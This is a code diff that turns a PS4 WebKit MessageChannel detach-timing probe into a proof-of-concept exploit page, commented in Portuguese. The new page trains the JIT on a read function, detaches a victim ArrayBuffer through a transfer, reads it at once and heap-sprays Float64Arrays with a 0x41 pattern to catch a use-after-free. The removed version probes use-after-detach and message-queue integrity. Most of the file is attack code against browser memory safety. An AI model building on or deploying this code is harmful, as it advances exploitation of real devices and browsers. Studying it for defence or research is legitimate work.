@@ -1,170 +1,161 @@
-
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>PS4 DROP + UaD Timing + Queue Integrity</title></head>
+<head>
+<meta charset="UTF-8">
+<title>PS4 WebKit: JIT + Spray PoC</title>
+</head>
 <body>
-<h2>PS4 MessageChannel: DROP + UaD Timing + Pós-DROP Queue Integrity</h2>
 
-<button onclick="run()">RUN AUTO</button>
-<button onclick="stop()">STOP</button>
-<button onclick="resetLog()">Reset log</button>
+<h1>PS4 WebKit PoC: JIT Confusion & Heap Spray</h1>
 
-<p>
-Attempts: <input id="n" type="number" value="30">
-Delay(ms): <input id="delay" type="number" value="30">
-Timeout(ms): <input id="timeout" type="number" value="200">
-LateCheck(ms): <input id="late" type="number" value="800">
-</p>
+<div>
+    <button onclick="trainJIT()">1. TRAIN JIT (Warmup)</button>
+    <button onclick="runExploit()">2. RUN RACE + SPRAY</button>
+    <button onclick="reset()">RESET</button>
+</div>
 
-<pre id="log"></pre>
+<hr>
+<div id="status" style="font-weight:bold;">Status: Idle</div>
+<pre id="log" style="border:1px solid #ccc; min-height:200px;"></pre>
 
 <script>
-let RUN = false;
+// CONFIGURAÇÃO
+const SPRAY_SIZE = 1000;     // Quantidade de arrays para alocar
+const SPRAY_LEN = 1024 * 32; // Tamanho de cada bloco de spray
+const TRAIN_CYCLES = 10000;  // Quantas vezes rodar para otimizar (JIT)
 
-function log(s){ document.getElementById("log").textContent += `[${Date.now()}] ${s}\n`; }
-function resetLog(){ document.getElementById("log").textContent=""; log("Reset."); }
-function stop(){ RUN = false; }
-function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
-function microtask(){ return Promise.resolve(); }
+// VARIAVEIS GLOBAIS
+let sprayStore = [];
+let compiledFunc = null;
+let victimBuffer = null;
+let victimView = null;
 
-async function run(){
-  RUN = true;
-  const N = +n.value|0;
-  const delayMs = +delay.value|0;
-  const timeoutMs = +timeout.value|0;
-  const lateMs = +late.value|0;
+function log(msg) {
+    document.getElementById("log").textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+}
 
-  log("============================================================");
-  log(`RUN AUTO :: N=${N} timeout=${timeoutMs}ms delay=${delayMs}ms lateCheck=${lateMs}ms`);
-  log("============================================================");
+function setStatus(msg) {
+    document.getElementById("status").textContent = "Status: " + msg;
+}
 
-  const stats = {
-    detach_ok:0,
-    drop_fast:0,
-    drop_confirmed:0,
-    late_delivery:0,
+function reset() {
+    sprayStore = [];
+    victimBuffer = null;
+    victimView = null;
+    document.getElementById("log").textContent = "";
+    setStatus("Reset done. Memory cleared (hopefully).");
+}
 
-    // UaD-timing probes (mais sensíveis)
-    uad_index_no_throw:0,   // se NÃO lançar ao ler u8[0] após detach → suspeito
-    uad_dataview_no_throw:0,
+// ------------------------------------------------------------------
+// 1. A FUNÇÃO ALVO (JIT TARGET)
+// O objetivo é fazer o navegador compilar esta função removendo
+// as checagens de segurança (Bounds Check Elimination).
+// ------------------------------------------------------------------
+function dangerousRead(arr, index) {
+    // Operação simples que o JIT gosta de otimizar.
+    // Se o JIT remover a checagem de "detached", isso vai ler lixo.
+    return arr[index]; 
+}
 
-    // Pós-DROP Queue Integrity
-    queue_suspect_after_drop:0,
-    queue_ok_after_drop:0
-  };
+// Função de treinamento
+function trainJIT() {
+    setStatus("Training JIT...");
+    log("Iniciando JIT Warmup...");
+    
+    // Cria um buffer válido para treinar
+    const trainBuf = new ArrayBuffer(1024);
+    const trainView = new Uint8Array(trainBuf);
+    trainView[0] = 0xAA; // Valor conhecido
 
-  let samples = [];
-
-  for (let i=0; i<N && RUN; i++){
-    const ch = new MessageChannel();
-
-    // payload
-    const ab = new ArrayBuffer(4096);
-    const u8 = new Uint8Array(ab);
-    u8[0] = 0xAA;
-
-    let got = undefined;
-    let gotAt = -1;
-
-    ch.port2.onmessage = (ev) => { got = ev.data; gotAt = Date.now(); };
-
-    // transfer
-    let threw = false;
-    try { ch.port1.postMessage(ab, [ab]); }
-    catch(e){ threw = true; }
-
-    if (threw){ await sleep(delayMs); continue; }
-
-    // Observação rápida (fast path)
-    await microtask();       // microtask timing
-    const senderLen_mt = ab.byteLength;
-
-    await sleep(0);          // task timing
-    const senderLen_t0 = ab.byteLength;
-
-    await sleep(delayMs);    // estabiliza
-    const senderLen = ab.byteLength;
-
-    const detached = (senderLen === 0);
-    if (detached) stats.detach_ok++;
-
-    // classifica DROP rápido (fast)
-    const isFastDrop = detached && (got === undefined);
-    if (isFastDrop) stats.drop_fast++;
-
-    // UaD timing probes: após DETACH, ler índice e DataView DEVEM falhar (normalmente TypeError).
-    // Se NÃO falhar, é uma janela “concreta” (não prova exploração, mas prova uso pós-detach).
-    if (detached){
-      // Probe 1: u8[0] deve lançar em buffer detached (se não lançar -> suspeito)
-      try {
-        void u8[0];
-        // se chegou aqui, não lançou
-        stats.uad_index_no_throw++;
-        if (samples.length < 3) samples.push({i, kind:"uad_index_no_throw", senderLen_mt, senderLen_t0, senderLen});
-      } catch(e){}
-
-      // Probe 2: DataView em detached deve lançar ao construir ou ao ler
-      try {
-        const dv = new DataView(ab);
-        void dv.getUint8(0);
-        stats.uad_dataview_no_throw++;
-        if (samples.length < 3) samples.push({i, kind:"uad_dataview_no_throw", senderLen_mt, senderLen_t0, senderLen});
-      } catch(e){}
+    // Executa milhares de vezes para forçar o Turbofan/JIT a otimizar
+    // e assumir que "arr" será sempre um Uint8Array válido.
+    for (let i = 0; i < TRAIN_CYCLES; i++) {
+        const res = dangerousRead(trainView, 0);
+        if (res !== 0xAA) {
+            log("Erro durante o treino! JIT falhou?");
+            return;
+        }
     }
+    
+    log("JIT Warmup Completo. A função 'dangerousRead' deve estar otimizada.");
+    setStatus("JIT Ready.");
+}
 
-    // Confirma se é DROP real ou “late delivery”
-    if (isFastDrop){
-      await sleep(lateMs);
-      if (got !== undefined){
-        stats.late_delivery++;
-        if (samples.length < 3) samples.push({i, kind:"late_delivery", gotType: typeof got, gotAt});
-      } else {
-        stats.drop_confirmed++;
-        // Pós-DROP Queue Integrity: manda sequência curta e valida ordem.
-        // Se a fila estiver corrompida, você vê missing/outOfOrder.
-        const tokens = ["A","B","C"];
-        const recv = [];
-        const chq = new MessageChannel();
-        chq.port2.onmessage = (ev)=> recv.push(ev.data);
+// ------------------------------------------------------------------
+// 2. HEAP SPRAY
+// Tenta preencher a memória liberada com um padrão conhecido (0x41 = 'A')
+// Se lermos 0x41414141, sabemos que lemos nosso próprio spray.
+// ------------------------------------------------------------------
+function doSpray() {
+    // Usa Float64Array pois é muito comum em exploits de WebKit
+    // Cada elemento ocupa 8 bytes.
+    for (let i = 0; i < SPRAY_SIZE; i++) {
+        const arr = new Float64Array(SPRAY_LEN);
+        // Preenche com um valor float específico que em hex parece reconhecível
+        // 1.39064994160909e-309 é aprox 0x4141414141414141 em double precision
+        arr.fill(1.39064994160909e-309); 
+        sprayStore.push(arr);
+    }
+    return sprayStore.length;
+}
 
-        // “toca” a fila: 3 mensagens pequenas
-        chq.port1.postMessage(tokens[0]);
-        chq.port1.postMessage(tokens[1]);
-        chq.port1.postMessage(tokens[2]);
+// ------------------------------------------------------------------
+// 3. O EXPLOIT (Race Condition + JIT + Spray)
+// ------------------------------------------------------------------
+async function runExploit() {
+    setStatus("Running Exploit...");
+    log("Preparando vítima...");
 
-        await sleep(timeoutMs);
+    // Cria o buffer "Vítima"
+    victimBuffer = new ArrayBuffer(1024);
+    victimView = new Uint8Array(victimBuffer);
+    victimView[0] = 0xBB; // Valor inicial seguro
 
-        const okCount = (recv.length === 3);
-        const okOrder = okCount && (recv[0]==="A" && recv[1]==="B" && recv[2]==="C");
+    const mc = new MessageChannel();
+    
+    // Agendar o detach (Transfer)
+    // A ideia é que o detach ocorra exatamente enquanto tentamos ler
+    log("Tentando Race Condition...");
 
-        if (okOrder){
-          stats.queue_ok_after_drop++;
+    try {
+        // 1. Envia o buffer para a porta 2 (Isso causa o Detach/Drop)
+        mc.port1.postMessage(victimBuffer, [victimBuffer]);
+        
+        // 2. IMEDIATAMENTE tenta ler usando a função otimizada (JIT)
+        // Se a proteção falhar, ele vai ler memória liberada.
+        const val = dangerousRead(victimView, 0);
+
+        // 3. IMEDIATAMENTE faz o Spray para ocupar o lugar
+        doSpray();
+
+        // 4. Analisa o resultado
+        if (val === undefined) {
+            log("Resultado: undefined (Safe Detach - Proteção funcionou).");
+        } else if (val === 0) {
+            log("Resultado: 0 (Safe Detach - Leu zero).");
+        } else if (val === 0xBB) {
+            log("Resultado: 0xBB (Race falhou - Leu antes do detach).");
         } else {
-          stats.queue_suspect_after_drop++;
-          if (samples.length < 3) samples.push({i, kind:"queue_suspect_after_drop", recv});
+            // SUCESSO?
+            log("!!! ANOMALIA DETECTADA !!!");
+            log("Valor lido pós-detach: " + val);
+            log("Hex: 0x" + val.toString(16));
+            alert("Potential UAF! Value: " + val);
         }
 
-        try { chq.port1.close(); chq.port2.close(); } catch(e){}
-      }
+    } catch (e) {
+        // Se o navegador for seguro, ele vai lançar TypeError aqui.
+        log("Exceção capturada (Seguro): " + e.message);
+        
+        // Vamos tentar o spray mesmo assim, só para ver se causa crash
+        log("Tentando spray pós-erro...");
+        doSpray();
+        log("Spray concluído sem crash.");
     }
-
-    // progresso mínimo
-    if ((i+1) % 10 === 0) log(`progress: ${i+1}/${N}`);
-    await sleep(delayMs);
-
-    try { ch.port1.close(); ch.port2.close(); } catch(e){}
-  }
-
-  log("------------------------------------------------------------");
-  log("RESULT SUMMARY:");
-  log(JSON.stringify(stats));
-  if (samples.length){
-    log("SAMPLES:");
-    log(JSON.stringify(samples));
-  }
-  log("DONE.");
+    
+    setStatus("Done.");
 }
-resetLog();
+
 </script>
 </body>
 </html>
